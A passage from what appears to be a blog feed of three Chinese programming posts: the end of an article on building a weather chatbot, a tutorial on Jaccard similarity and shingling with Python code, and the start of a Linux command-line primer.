
你會發現，當你想要知道氣象資訊時，一個句子的組合大概就是:
[地點][時間][天氣關鍵字｜天氣抽象名詞]
在這個情況下，氣象機器人其實只需要用樣板模型就可以達成需求了，並且精準度也可以達到幾乎百分之百。因為在查詢天氣的時候，我們不需要判斷使用者的隱晦含義，或是句子是正向還是負向含義，因此不需要語意分析、機器學習等等方法介入。
此外即使是多輪對話的形式，還是可以只靠樣版模型就可以了，我們剛剛提到三要素，地點、時間、天氣關鍵字，所以最多只需要三輪對話，例如使用者只說了「台北」，機器人就問他說要哪個「時間」，再問他說要知道「空氣品質」還是「天氣狀況」。
但事實上，氣象機器人大多情況只需要一輪就夠了。因為假設使用者只說「地點」，那我們可以預期他就是問現在狀況，頂多一週天氣趨勢。當使用者只說「時間」或「天氣關鍵字」，我們可以預期地點是他發訊息的所在地。
因此其實氣象機器人不需要多輪式對話，因為查詢天氣就是一個很單純的動作，即便使用者輸入並未得到想要的資料，只要重新下夠明確的句子，例如「下週二紐約氣象預報」就可以得到答案。
樣板式模型實作樣版式模型其實感覺也什麼技巧，但要注意樣板能應付所有情況。此外樣板模型其實就是決策樹，採用時要注意路徑的設計，例如以天氣查詢來說，路經應該是「天氣關鍵字」優先判斷，才會進入「地點」或「時間」的判斷。當句子只有地點或時間時，假設是一對一情況下，使用者只說「台北」，你大概能猜他想問台北天氣。但因爲機器人能在群組中使用，這時候有明確的「天氣關鍵字」出現，才能準確做出回應。
例如以「天氣」指令來說，我的邏輯是這樣：
// ...// 一些預處理，抓地點、時間、氣象關鍵字等// ...&#125; else if (isWeatherKeyword) &#123;  // 如果是要回應「天氣」況狀，例如：天氣、濕度、溫度    let replyMsg = &quot;&quot;; // 將回傳給使用者的資訊    // ...    if (isTimeKeyword) &#123; // 如果有時間關鍵字，並且不是現在，就採用預報        replyMsg = await getForecast(); // 取得氣象預報資料    &#125; else &#123; // 不然就回答現在天氣        replyMsg = await getWeather(); // 取得現在氣象狀況    &#125;    await platformReplyText(context, replyMsg); // 回傳給 Line 或 Messenger&#125; else if(/* 其他氣象關鍵字，例如：空氣品質、 */) &#123;// ....

所以假設今天句子是「台北天氣」，就會是找台北現在天氣。如果句子是「明天台北天氣」，就會去找氣象預報的資料。你可能會好奇那「地點」呢？其實我是在 getForecast() 和 getWeather() 函數底下才處理地點。
決策樹的細節我就不多作介紹，大致上就是用這樣的判斷方式把所有使用者可能會下的問句都解析並回應。
資料來源一個氣象機器人最重要的部分就是氣象資料了，一般來說資料取得有幾種方式：

爬蟲
公開 API
隱藏版 API

爬蟲所謂爬蟲就是去開網頁，找出網頁原始碼中的資料，並擷取出來，例如我可以去找氣象局網站中的氣溫數字，在原始碼中就會長這樣：

公開 API公開 API 就是一些開放平台，或是商業機構，提供正式的 API 服務，可以藉由這些 API 取得你要的資料。例如：

氣象資料開放平臺：氣象局的公開資料
Open Weather Map：國外的氣象資料服務商

還有很多，就不多列舉了。
隱藏版 API這個技巧通常初學者都不知道，特別介紹一下。剛剛提到說，爬蟲是去抓 HTML 的欄位資料，但是很多時候 HTML 是透過 JS 事後補上去的。是的，這就是 MVC 框架下的網站架構。網站會先渲染版面，然後再由 HTTP Request 呼叫他自己的 API 取得剩下的資料，並用 JS 把資料補到渲染畫面上。
所以我們要做的事情就是，攔截網站自己的 API，這些 API 不是公開的，但是我們也可以拿來用。不過風險是，因為這些 API 不是對外公開的，可能用法或是名稱常常再改變。

以上圖為例，Breezo Meter 是一個可以查空氣品質的網站，我想看看它是不是有自己的 API，所以我打該網頁，然後開啟「開發者工具」，點開「網路」然後選「XHR」。
這時候我們會看到有好幾筆資料，我就每一筆都點開看看，然後看「回應」的部分，所謂回應就是 HTTP Request 的 Response，如果他是一隻 API，就會看到 Json 格式的資料，然後我們就成功攔截 API 了！我們就可以直接使用隱藏版 API 來取得資料，通常會比寫爬蟲還方便，但風險就是他可能隨時會變。
資料處理資料庫我有兩台伺服器分別處理不同聊天平台，但資料庫應該要共用，所以把資料部分獨立出來。資料庫部分我使用 Firebase，因為 Firebase 不需要去管伺服器的問題，比起我自己在弄一台專門的資料庫伺服器方便。
資料庫主要是用來記錄一些高成本的資訊，例如「空氣品質的圖」其實是兩張圖片合成，每次有使用者查詢都合成一次很浪費資源，所以在第一位使用者查詢時，跑過一次影像處理就把他存起來，在同時間內有其他查詢就直接調用資料庫。
這邊可能會有問題，為什麼不用伺服器定時跑資料存到資料庫？這是因為目前使用者大約一千，查詢頻率其實沒有到很高，所以想說愛地球，有需要再跑就好。
一般做法都是把所有可能會調用的資料都用固定排成先跑好，像是爬蟲、調用 API、圖片處理等等都每隔一段時間自動執行並儲存，只是我覺得使用量還沒那麼大所以沒這樣做。
圖片氣象機器人可以直接下關鍵字得到天氣圖、衛星圖、預報圖等，甚至我連地震圖都支援。但是 Line 規定圖片來源要是 HTTPS，很遺憾中央氣象局只有 HTTP，所以我必須先把圖片傳給第三方圖片服務商，這邊我是用 Imgur。然後再把上傳 Imgur 的圖片傳到 Line 上。因為圖片轉介很花時間，而且同一張圖片其實可以再利用，所以最後傳到 Imgur 的圖片都會用 Firebase 記錄起來。
氣象資料原始氣象資料可能會需要處理，例如:

體感溫度必須自己從測站資料去算
風向都是數字，要轉成方位
空氣品質好壞指標 AQI 是數值，要轉換成描述文字例如「對過敏族群不健康」

簡單明瞭地把數據呈現給使用者也很重要。
關鍵字的處理時間要能辨識句子的時間，才能知道要給哪個時間的資料，所以機器人要能辨識「明天晚上」、「今天 20:00」、「明天 6:30pm」這類的時間語句。
這邊我採用 Chrono Node，他辨識的能力真的滿不錯的，而且支援英文中文混雜。不過我後來發現他中文支援度不完整，例如中文的「前天」、「後天」、「大後天」並不支援，所以我有幫忙寫補丁，不過發 Pull Request 之後作者一直沒有回應，感覺是沒在維護了。所以氣象機器人是安裝我自己修改過的 fork 版本。
Chrono 處理中文時間方法我覺得滿不錯的，這邊簡單示例：
由於中文表示時間的組合就那麼多，所以全部列出來。
var PATTERN = new RegExp(    &#x27;(而家|立(?:刻|即)|即刻)|&#x27; +    &#x27;(今|明|前|大前|後|大後|聽|昨|尋|琴)(早|朝|晚)|&#x27; +    &#x27;(上(?:午|晝)|朝(?:早)|早(?:上)|下(?:午|晝)|晏(?:晝)|晚(?:上)|夜(?:晚)?|中(?:午)|凌(?:晨))|&#x27; +    &#x27;(今|明|前|大前|後|大後|聽|昨|尋|琴)(?:日|天)&#x27; +    &#x27;(?:[\\s|,|，]*)&#x27; +    &#x27;(?:(上(?:午|晝)|朝(?:早)|早(?:上)|下(?:午|晝)|晏(?:晝)|晚(?:上)|夜(?:晚)?|中(?:午)|凌(?:晨)))?&#x27;, &#x27;i&#x27;);

根據中文描述轉換成時間概念。
// .....&#125; else if (match[DAY_GROUP_1]) &#123; // 處理中文字有關於「天」的部分    var day1 = match[DAY_GROUP_1];    var time1 = match[TIME_GROUP_1];    if (day1 == &#x27;明&#x27; || day1 == &#x27;聽&#x27;) &#123;        // 如果半夜說明天，通常是今天的概念        if(refMoment.hour() &gt; 1) &#123;            startMoment.add(1, &#x27;day&#x27;);        &#125;    &#125; else if (day1 == &#x27;昨&#x27; || day1 == &#x27;尋&#x27; || day1 == &#x27;琴&#x27;) &#123;        startMoment.add(-1, &#x27;day&#x27;);    &#125; else if (day1 == &quot;前&quot;)&#123;        startMoment.add(-2, &#x27;day&#x27;);    &#125; else if (day1 == &quot;大前&quot;)&#123;        startMoment.add(-3, &#x27;day&#x27;);    &#125; else if ( day1 == &quot;後&quot;)&#123;        startMoment.add(2, &#x27;day&#x27;);    &#125; else if (day1 == &quot;大後&quot;)&#123;        startMoment.add(3, &#x27;day&#x27;);    &#125;    if (time1 == &#x27;早&#x27; || time1 == &#x27;朝&#x27;) &#123;        result.start.imply(&#x27;hour&#x27;, 6);    &#125; else if (time1 == &#x27;晚&#x27;) &#123;        result.start.imply(&#x27;hour&#x27;, 22);        result.start.imply(&#x27;meridiem&#x27;, 1);&#125; else if (match[TIME_GROUP_2]) &#123; // 處理中文字有關於「時」的部分

上面只是中文處理的部份而已，可以把「明天晚上」、「後天早上」等時間概念轉換成 Date() 物件。此外 Chrono 最好用的部分是不同語言的模組互通，所以可以混搭例如「明天 8:00pm」。中文數字處理以及英文時間判斷就留給讀者自行去看原始碼囉！
此外在開發過程中我被「時間」折騰個半死，因為伺服器在美國，使用者應該是在台灣（很不嚴謹的假設，我還沒去研究如何從 line 或 messenger 中取得使用者時區），中央氣象局資料時間是台灣時間，所以要一直轉換來比對時間。
轉換時間真的是暈頭轉向：

伺服器收到訊息，要判斷句子中的時間，然後假設使用者是在台灣，以此換成 UTC 標準時間。
再將伺服器時間也轉成 UTC 標準時間，比較句子時間與伺服器時間，檢查時間是否在未來。
是未來就去撈氣象局預報資料，並將氣象局資料轉成 UTC 標準時間，找出與句子時間符合的氣象數據。

此外 NodeJS 的國際化元件（ICU）原來預設是裝 small-icu，想要完整的話要裝 full-icu。國際化元件可以讓時間表達成中文，原本 NodeJS 會直接將晚上八點表達成 20:00，但是完整的國際化元件可以讓他表示成 下午 8:00。
npm install full-icu --save

執行 NodeJS 的時候要這樣來使用完整的國際化元件：
node --icu-data-dir=./node_modules/full-icu index.js

地點要判斷句子中的地點真的很難，世界的地名五花八門，連「太陽」都可以是地名。我的處理辦法是分台灣地區和國外地區。

台灣地區：台灣的行政區最低層級是村或里，全部加起來也才不到一萬個，所以台灣地區先建檔，可以很明確的辨識出來。檔案包含縣市、鄉鎮市、村里和經緯度資訊。
非行政地區、國外地區：如果是非行政區的地名，例如台灣大學、總統府等等，或是國外的地區，例如紐約、東京等。這時候我會用 Google Map Api 來查對應的經緯度。

為什麼都是經緯度呢？

台灣地區會去查使用者查詢地點的最近的測站，因為我有每個測站的經緯度，所以會去算彼此距離，並取得數據。例如查台北公館天氣狀況，因為台灣大學就有觀測站（台大就在公館），所以會得到台灣大學觀測站的數據資料。
國外的氣象 API 通常都是用經緯度當參數。

值得一提的是，台灣的氣象測站真的很密，台灣的氣象測站大約有四百個，但是如果換在國外的話，一個台灣大小的區域，可能只有一個測站。所以國外服務商的氣象資訊常常都是使用內插外插來取得近似值，換言之就是很不精確啦！但台灣因為太密了，直接找最近的測站的數據就好，而且很準！
地名處理由於中文字整串黏在一起的特性，要能準確判斷他是不是地名，不能直接用這樣判斷：
if(message.includes(&quot;北海道&quot;))

因為原句可能是「北海、道路」，大概是這種感覺。
這邊我用結巴分詞，來把句子切割成一個個詞。這個模組簡單原理就是用詞頻來決定要不要做切割。不過其實在預設問句中一定要有地名的情況下，這樣做用處不大。實際比較有感可能是像 Siri 這種可以回答各種天馬行空問題的機器人才要能正確辨識是不是有地名的概念，還是只是湊巧兩個字連在一起罷了。但考量未來可擴充性，我先採用比較高級一點的方式處理。
總結我大致上已經將我如何實作氣象機器人的技術都介紹了，未來我會持續讓他越來越好，目前樣板式模型最大缺點就是會有無法辨識的情況，這時候我會回應讓使用者直接查看使用說明，但真正好的服務是不需要使用說明的，一個好的聊天機器人應該跟人一樣聰明對吧？
很高興不知不覺就有超過一千名使用者，隨者使用者變多，未來架構可能也還會需要調整，如同所有規模逐漸成長的公司的後端架構一樣，A&#x2F;B 測試、紅藍部署等等技術都是隨著規模擴大而將慢慢導入。

你可以在這邊查看氣象機器人的 Github Repo



關於作者劉安齊軟體工程師，熱愛寫程式，更喜歡推廣程式讓更多人學會。歡迎追蹤 **微中子**，我會在上面分享各種新知與最新作品，也可以去逛逛我的 個人網站 或 **Github**。

]]></content>
      <tags>
        <tag>line-bot</tag>
        <tag>messenger-bot</tag>
        <tag>weather</tag>
        <tag>bot</tag>
      </tags>
  </entry>
  <entry>
    <title>Shingling, MinHashing and Common distance measure I</title>
    <url>/2017/10/01/level-3-shingling-minhashing-and-common-distance-measure-i/</url>
    <content><![CDATA[誰適合閱讀這篇文章：熟悉 Hash, Set, Tries (Prefix and Suffix Tree) 等資料結構和有志從事大量資料分析的電腦工程師
主要解決問題：給定一份文件，如何在網際網路的無盡文件大海中，找到相似的文件？主要應用：偵測剽竊 (Plagiarism)，搜尋引擎欲尋找鏡像網頁，網路購物或電影推薦系統中的協同過濾
綱要：

如何快速比較兩文件集合並提供量化結果: a.  如何定義相似度？ b.  如何重新定義相似度比較問題為集合問題。 
如何實現快速比較高相似度文件（第二篇)  
應用相似搜尋於巨量資料: minHash and Locality-Sentive Hashing （第三篇）
更多關於 Locality-Sentive Hashing （末篇）

在閱讀這篇教學後，妳將會學到：

現行的文獻技術中，如何定義兩文件的相似度？
如何使用 Shingle 來轉換原問題為集合比較問題？
如何使用 Jaccard similarity 來比較文件的相似度？


在進入如何實作快速且有效比較大量文件之前，我們先來瞭解一下，在現行的文獻技術中，有哪些數值標準，可以用來量化兩份文件的相似程度。
給定兩個有著相同長度的字串，最簡單的方法，便是我們可以數有幾個不一樣的字母，來當作兩個字串相異的程度。這就是 Hamming Distance 所採用的方法，簡單的舉例：
Harry  PotterHerry  Potter01000  000000 &#x3D;&gt; 若相同字母則用 0，不同字母則用 1  
由上可看得到字串一：”Harry Potter” 和字串二：”Herry Potter” 相異程度只有 1 （相似度則高達 10）。同樣的比較另外兩個字串：  
Harry PotterFerry Poster11000 001000  
嗯，用肉眼看都覺得差很多。不過電腦沒有肉眼可看，也沒有人卓越大腦具有的平行處理的能力。所以請幫幫電腦瞭解，該怎麼用 Hamming distance 比較兩字串的相異程度吧！  
from functools import reducefrom operator import adddef hamming_distance(str1, str2):    assert(len(str1) == len(str2))    return(reduce(add, [ch1 != ch2 for ch1, ch2 in zip(str1, str2)]))str1, str2 = &#x27;Harry Potter&#x27;, &#x27;Ferry Poster&#x27;print(&#x27;Hamming distance for \&#x27;&#123;&#125;\&#x27; and \&#x27;&#123;&#125;\&#x27; is &#123;&#125;&#x27;.format(        str1, str2, hamming_distance(str1, str2)))

Hamming distance for &#39;Harry Potter&#39; and &#39;Ferry Poster&#39; is 3

Hamming distance 一開始是用在電信通訊時，檢查傳輸是否正確，通常數位傳輸都是以 0&#x2F;1 來表示，一般的應用是用來比較兩個二元字串，如 01000… 和 10000…。但如我所舉的例子，其應用並不只限於二元字串，只要是長度相同的字串，皆可以用 Hamming distance 來表示相異程度。但這並不代表，長度相同的字串，都要用 Hamming distance 來表示。為什麼呢？
因為字串的編輯過程要比我們所看到的還要複雜。也就是，我們雖然看到 Harry Potter 和 Herry Potter 只相差一個字母，可是如果 Herry 其實是打字員將 Harry 先誤看成 Henry，又一時手誤打成了 Herry 呢？這時候，我們就需要第二種測量字串相異程度，Edit distance。
再繼續我們粗心打字員的例子，也就是 Harry 先經歷了刪除 ar 然後又新增成為 en，變成了 Henry。最後又將 n 取代成了 r，才成為我們現在所看到的 Herry。從 Harry 到 Herry 所需的編輯步驟，則包括了兩個刪除 (deletions)，兩個新增 (insersions) 和一個取代 (replacement)。如果將編輯的歷史考慮在內，而不僅只是如 Hamming distance 就所觀察到的字串來計算相異程度，Herry 跟 Harry 的距離其實比我們所想像的還要遙遠哪！
而定義有效的編輯步驟，則因應用而異。一般最簡單的應用僅會考慮，刪除和新增，因為取代本身就包含了一個刪除和一個新增。但在生物資訊的應用上，通常會假設突變取代的可能。也就是若以 DNA 序列為例，與其將鹼基的突變，看成兩個步驟，其實當作一個步驟的可能性較高，所以又另外增加了取代的編輯步驟。此外，用 Edit distance，我們再也不需要需要長度相同這個限制了，因為刪除和新增的兩個編輯步驟，我們可以任意比較兩個長度不同的字串了。
現在，我們需要再回到 Hamming distance 上。和 Hamming distance 觀念上相近，但測量的是兩集合（set）的相似程度，一般則是使用 Jaccard Similarity。如果，今天我們比較的不是兩個字串，而是兩份文件呢？在講到比較文件前，讓我們回到學生時代，老師要檢查學生的出席時，是怎麼做的呢？  
一般當然是按照學生名冊，逐一比對出席的同學，然後看有多少同學是有出席，有多少是缺席的。這個比較相同的過程，就涉及了求交集（intersection） 的觀念。
我們可以將老師的學生名冊和在教室裡的學生當作是兩個集合，這兩個集合都不包含重複的學號或學生，換句話說兩集合中的元素都是獨一無二的，但兩集合卻可以找到一對一，或一對無的對映。一對無的情況可以試想，有學生退選這門課，但學生名冊沒有立即更新，或沒有註冊這門課的學生來旁聽。  
所以，如果我們感興趣的問題是，有多少學生出席今天的課？那麼我們就可以計算在出席學生佔註冊學生和旁聽學生的比例。在分母的部份，也就是計算出席學生和註冊學生的共同集合則是求聯集的觀念 (union)。我們可以根據常理推斷，總出席人數絕對不會多於兩集合的聯集，也就是比例會在 0 和 1 的封閉區間內，其值不會大於 1 或小於 0。因為使用交集和聯集的比例，所有不同大小的兩集合相似度，都可以映射到 0 和 1 的數值（可是，這樣會有個小問題，來猜猜看是什麼吧？註1），所以我們也可以放心的用這個比例來當作計量方法進行比較。 
既然，我們已經從 Hamming distance 的字串比較，升級到比較集合的觀念。但在班級的比喻中，我們對於集合中的元素，有一個假設，辨識集合中的元素不能重複，事實上也是如此，因為沒有兩個人是相同的，這樣不擁有重複元素的集合，叫做 Set。但是，在比較字串中，這樣的集合顯然是不會發生的，於是我們就需要延伸 Jaccard similarity 的計算到能擁有重複元素的集合，這樣的資料結構稱為 Bag 或是 Multiset，而兩 Bags 之間的 Jaccard similarity 則又稱為 Jaccard Bag Similarity。在定義 Jaccard Bag Similarity 時，求交集可以用求每個元素出現在兩集合的最小頻率，而聯集的部份則有兩個做法，一是用每個元素在兩集合出現頻率的總和，但這樣的問題是， Jaccard Bag similarity 的最大值，就不再是 1 而是 1&#x2F;2。為了能繼續維持 Jaccard similarity 的特性，用最大頻率來代表聯集，較常使用於不同元素數量的 Bag 比較。
拿書上的練習來作例子[1, Exercise 3.1.2]：假設有三個 bags 分別為：
A &#x3D; {1, 1, 1, 2}B &#x3D; {1, 1, 2, 2, 3}  
則若將 A, B 當作不可有重複元素的 Set 來看，集合會變成：A &#x3D; {1, 2}B &#x3D; {1, 2, 3}  
則 Jaccard similarity 為$\frac{A \cap B}{A \cup B} &#x3D; \frac{\{1, 2\}}{\{1, 2, 3\}}&#x3D; \frac{2}{3}$但若是將 A, B 當作可有重複元素的 Bag&#x2F;MultiSet 來看，則 Jaccard Bag Similairity 則為：$\frac{A \cap B}{A \cup B} &#x3D;\ \frac{min(A, B)}{max(A, B)} &#x3D;\ \frac{2+1+0}{3+2+1}&#x3D;\frac{1}{2}$
看起來就沒有這麼相似啦！這就是 Jaccard Similarity 的定義。而簡單的 python code 和兩個例子代表的 Venn Graph 則是如下：
from functools import reducefrom operator import or_from operator import and_from operator import addfrom itertools import zip_longestfrom collections import namedtupledef jaccard_similarity(str1, str2, allow_repeat=False):    if not allow_repeat:        if type(str1) == set and type(str2) == set:            uniqs = [str1, str2]        uniqs = list(map(set, [str1, str2]))        return(len(reduce(and_, uniqs))/len(reduce(or_, uniqs)))    else:        freqs = &#123;k: [0, 0]                 for k in reduce(or_, list(map(set, [str1, str2])))&#125;        for ch1, ch2 in zip_longest(str1, str2):            if ch1 is not None:                freqs[ch1][0] += 1            if ch2 is not None:                freqs[ch2][1] += 1        return(reduce(add, map(min, freqs.values()))/ reduce(add, map(max, freqs.values())))        str1, str2 = &#x27;1112&#x27;, &#x27;11223&#x27;print(&#x27;Jaccard Similarity for sets \&#x27;&#123;&#125;\&#x27; and \&#x27;&#123;&#125;\&#x27; is &#123;:.2f&#125;:&#x27;.format(        str1, str2, jaccard_similarity(str1, str2)))print(&#x27;Jaccard Similarity for bags \&#x27;&#123;&#125;\&#x27; and \&#x27;&#123;&#125;\&#x27; is &#123;:.2f&#125;:&#x27;.format(        str1, str2, jaccard_similarity(str1, str2, True)))

Jaccard Similarity for sets &#39;1112&#39; and &#39;11223&#39; is 0.67:
Jaccard Similarity for bags &#39;1112&#39; and &#39;11223&#39; is 0.50:


再進入 Shingle 的觀念前，讓我們稍微整理一下之前所說的；
Hamming distance 是量測兩個相同長度的字串相異性，可以把兩個字串當成兩個字母的集合，而字母則是集合中的元素。Jaccard similarity 是量測兩個集合的相似性，比較兩集合中相同的元素，並將相似程度量化成在 0 到 1 的比例。Edit distance 是在將編輯歷史考慮在內的情況下量測兩任意字串相異性，簡單的說，就是定義 A 字串需要多少編輯步驟才能變成 B 字串。
先有了集合的概念後，和如何比較集合間的相似，接下來就是如何定義集合內元素。定義集合內的元素之所以重要，是因為元素的定義會影響比較的方法，規模，最終會影響集合比對的結果。在文字探勘的領域中，Shingling 就是一個常用的技術 [註 2]。Shingle 原本意思是鵝卵石，通常也可以當作建築的材料，在這裡可以看作是建立集合的基石。Shingle 可以是一個字彙，也可以是一個字母，可以是 K 個重疊且相連（overlapping and consecutive）的字母，或 K 個重疊且相連的字彙，端看應用為何？在網頁搜尋的應用中，多半是在字元的層級上來做分析，所以在錯別字或是同義字替換的容忍度上，沒有這麼高，也就無法作為語意理解的學習模型，但在低層級的比較上，如文件分析（Textual Analysis）卻已足夠。通常以單一 Shingle 作為集合中的元素，會造成集合間的低變異，因為較少的可用元素組合。試想，以英文字母作為 Shingle 來比較文件，若不考慮標點符號，總共只有 26 個選擇，以及若以 K 個字母作為 K-Shingle，則有 $26^K$ 個選擇，顯然地，後者可以組合的集合數目要大的多了！
我們現在稍微改變一下書中現成的例子[Example 3.4]，來說明定義 Shingle 對於比較集合相似度的影響：句子一： “the plane was ready for touch down”句子二： “the quarterback was ready for scoring a touchdown”皆不考慮大小寫，計算 Jaccard Similarity 的結果如下：



Definition of Shingles
Jaccard Similarity



以單一字母為 1-Shingle，不考慮空白
0.67


以 9 個字母為 9-Shingles，考慮空白
0.12


以 9 個字母為 9-Shingles，不考慮空白
0.08


以 3 個字彙為 3-Shingle words，不考慮 stop words
0.10


以 3 個字彙為 3-Shingle words，考慮 stop words [註 3]
0.20


def shingle(k, doc, remove_whitespaces = False):    &quot;&quot;&quot; calculate shingle given k by characters    &gt;&gt;&gt; sorted(shingle(2, [&quot;abcdabd&quot;]))    [&#x27;ab&#x27;, &#x27;bc&#x27;, &#x27;bd&#x27;, &#x27;cd&#x27;, &#x27;da&#x27;]    &gt;&gt;&gt; shingle(9, [&quot;The plane was ready for touch down&quot;]) &amp; shingle(    ... 9, [&quot;The quarterback scored a touchdown&quot;])    set()    &gt;&gt;&gt; shingle(9, [&quot;The plane was ready for touch down&quot;], True) &amp; shingle(    ... 9, [&quot;The quarterback scored a touchdown&quot;], True)    &#123;&#x27;touchdown&#x27;&#125;    &quot;&quot;&quot;    shingles = set()    for line in doc:        if remove_whitespaces:            line = line.replace(&quot; &quot;,&quot;&quot;)        for i in range(0, len(line) - k + 1):            shingles.add(line[i:i+k])    return(shingles)def word_shingle(k, doc, use_stopword=True):    &quot;&quot;&quot; calculate shingle given k by words    &gt;&gt;&gt; set([&quot;A spokesperson for&quot;, &quot;for the Sudzo&quot;, &quot;the Sudzo Corporation&quot;, &quot;that studies have&quot;,    ... &quot;have shown it&quot;, &quot;it is good&quot;, &quot;is good for&quot;, &quot;for people to&quot;, &quot;to buy Sudzo&quot;]) == word_shingle(3,    ... [&quot;A spokesperson for the Sudzo Corporation revealed today &quot;    ... &quot;that studies have shown it is good for people to buy Sudzo products.&quot;])    True    &gt;&gt;&gt; set([&quot;A spokesperson for&quot;, &quot;spokesperson for the&quot;, &quot;for the Sudzo&quot;,     ... &quot;the Sudzo Corporation&quot;]) == word_shingle(3,    ... [&quot;A spokesperson for the Sudzo Corporation&quot;], False)    True    &quot;&quot;&quot;    from nltk.corpus import stopwords    from nltk.tokenize import word_tokenize    shingles = set()    for line in doc:        tokens = word_tokenize(line)        for i in range(0, len(tokens) - k + 1):            if use_stopword == True and tokens[i].lower() in stopwords.words(&#x27;english&#x27;):                shingles.add(&#x27; &#x27;.join(tokens[i:i+k]))            if not use_stopword:                shingles.add(&#x27; &#x27;.join(tokens[i:i+k]))            i = i + 1    return(shingles)def print_out(k, str1, str2, call_back, **kwargs):    print(&quot;========&quot;)    results = [call_back(k, [s], **kwargs) for s in [str1, str2]]    print(&quot;the &#123;&#125;-shingle set from str1 is (&#123;&#125;)&quot;.format(k, &#x27;,&#x27;.join(results[0])))    print(&quot;the &#123;&#125;-shingle set from str2 is (&#123;&#125;)&quot;.format(k, &#x27;,&#x27;.join(results[1])))    print(&quot;the Jaccard similarity between two is &#123;:.2f&#125;&quot;.format(        jaccard_similarity(*results)))str1, str2 = &quot;the plane was ready for touch down&quot;, &quot;the quarterback was ready for scoring a touchdown&quot;print_out(1, str1, str2, shingle, remove_whitespaces=True)# comment 9-shingle output for clean output# print_out(9, str1, str2, shingle)# print_out(9, str1, str2, shingle, remove_whitespaces=True)print_out(3, str1, str2, word_shingle, use_stopword=False)print_out(3, str1, str2, word_shingle)

========
the 1-shingle set from str1 is (r,u,h,o,c,d,y,t,a,p,n,l,e,f,w,s)
the 1-shingle set from str2 is (u,r,h,c,o,d,q,y,t,a,k,n,e,i,f,b,w,g,s)
the Jaccard similarity between two is 0.67
========
the 3-shingle set from str1 is (the plane was,for touch down,ready for touch,plane was ready,was ready for)
the 3-shingle set from str2 is (was ready for,scoring a touchdown,ready for scoring,the quarterback was,for scoring a,quarterback was ready)
the Jaccard similarity between two is 0.10
========
the 3-shingle set from str1 is (the plane was,for touch down,was ready for)
the 3-shingle set from str2 is (for scoring a,the quarterback was,was ready for)
the Jaccard similarity between two is 0.20

不過，定義了 Shingle 只是向較為完備的語言分析跨進了一小步，面對廣袤的文件大海，兩兩比對文件的相似度，仍會造成如天文數字般可怕的計算數目，所以在實務巨量資料的應用上，我們仍然需要非常快速的方法來實現，這些技巧將會在下面幾篇提到。
最後，希望本文能引起許多女孩對於演算法的興趣，同時對平日相當散漫的我，能有效釐清一些困惑。若本文有任何不盡完善的地方，敬請批評指教囉！
註 1: 兩集合可以擁有相當高的 Jaccard Similarity，但不一定具有統計上的相似意義（statistical significance）。試想，若因為取樣誤差，兩集合都只包括一個元素，那麼 Jaccard Similiaryt 不是 1 就是 0，這樣計算出來的結果，誤導性就相當高了！註 2: Shingle 和文字探勘領域中經常使用的 n-gram，在 wiki 上的區別有點讓人感到困惑。Shingle 此詞最早是出現在 Border et al. 1997 年的文章，並沒有特別指出 Shingle 必須是字詞為單位，相反的只是定義 Shinge 為相連的子字串。（a contiguous subsequence）。事實上，我懷疑只是兩個可互相交換而不改變意義的專有名詞，只是 n-gram 的應用領域較廣，較為人知罷了！註 3: stop words 指的是語言模型中經常使用，但在文件比較中不具有識別性的效果。如定冠詞 the 和不定冠詞 a。
Reference:[1] Ch 3 Finding Similar Measure in Mining Massive Datasets by Jure Leskovec, Anand Rajaraman, Jeffrey D. UllmanCoursera Mining Massive Datasets course (Ch 3-1, 3-2 and some sections from 3-5)
關於作者：@renewang 人工智慧熱愛者，夢想能用大數據來促進世界和平
]]></content>
      <tags>
        <tag>演算法</tag>
        <tag>大數據</tag>
        <tag>mining massive dataset</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Command 命令列指令與基本操作入門教學</title>
    <url>/2017/12/23/linux-commnd-line-tutorial/</url>
    <content><![CDATA[
前言要成為一個真正的軟體工程師（Software Engineer）不一定一定要使用 vim 之類的編輯器進行開發，但熟悉使用終端機（terminal）操作和常用的 Linux 命令列指令碼操作則是必須的。因此接著我們將介紹軟體工程師在開發上常用的 Linux 命令列指令碼給讀者參考。若讀者使用的是 Windows 建議安裝 VirtualBox 並在上面跑 Linux&#x2F;Ubuntu 來進行指令碼操作，或是使用像是 Cmder 的工具來進行操作。關於相關工具安裝可以參考 如何在 Windows 打造 Python 開發環境設定基礎入門教學 這篇教學文章。好，那我們就準備開始吧！

什麼是 Linux？Linux 是一種自由開放原始碼的類 Unix 的作業系統，其廣泛運用於伺服器和嵌入式系統中。目前主流的 Linux 發佈版本（Linux distributions，係指可完整安裝使用的套件版本）包括：Debian、Fedora、CentOS、Ubuntu 等。以下我們主要將會聚焦在 Linux&#x2F;Ubuntu 常用指令和基礎操作的入門教學介紹上（每個指令前使用 $ 當作提示字元，不用輸入）。

Linux 檔案系統架構理論上所有的 Linux 發佈版本應該都要遵守檔案系統的標準（Filesystem Hierarchy Standard, FHS），但根據發佈版本不同或有差異，不過大致上檔案系統架構如下：

&#x2F;bin, &#x2F;sbin/bin 主要放置一般使用者可以操作的指令，/sbin 放置系統管理員可以操作的指令。連結到 /usr/bin，/usr/sbin 

&#x2F;boot主要放置開機相關檔案  

&#x2F;dev放置 device 裝置檔案，包話滑鼠鍵盤等

&#x2F;etc主要放置系統檔案

&#x2F;home, &#x2F;root/home 主要是一般帳戶的家目錄，/root 為系統管理者的家目錄

&#x2F;lib, &#x2F;lib64主要為系統函式庫和核心函式庫，若是 64 位元則放在 /lib64。連結到 /usr/lib, /usr/lib64

&#x2F;proc將記憶體內的資料做成檔案類型

&#x2F;sys與 /proc 類似，但主要針對硬體相關參數

&#x2F;usr/usr 全名為 unix software resource 縮寫，放置系統相關軟體、服務（注意不是 user 的縮寫喔！）

&#x2F;var全名為 variable，放置一些變數或記錄檔

&#x2F;tmp全名為 temporary，放置暫存檔案

&#x2F;media, &#x2F;mnt放置隨插即用的裝置慣用目錄， /mnt 為管理員&#x2F;使用者手動掛上（mount）的目錄

&#x2F;opt全名為 optional，通常為第三方廠商放置軟體處

&#x2F;run系統進行服務軟體運作管理處

&#x2F;srv通常是放置開發的服務（service），如：網站服務 www 等


檔案與目錄管理指令在 Ubuntu 中我們可以打開終端機進行指令操作，就可以透過指令來管理檔案。
一般指令格式如下：
$ 指令 [選項] [選項值]



ls：list，查看檔案及子目錄
 列出基本資料夾資料：
 ls

 列出詳細資料和隱藏資料：
 // -l 列出詳細資料 -a 列出隱藏資料$ ls -la

 列出部分檔案：
 // 列出為 .js 的檔案$ ls *.js

pwd：print work directory，印出目前工作目錄
 $ pwd// /Users/happycoder/Desktop/projects/HappyCoder

cd：change directory，移動進入資料夾
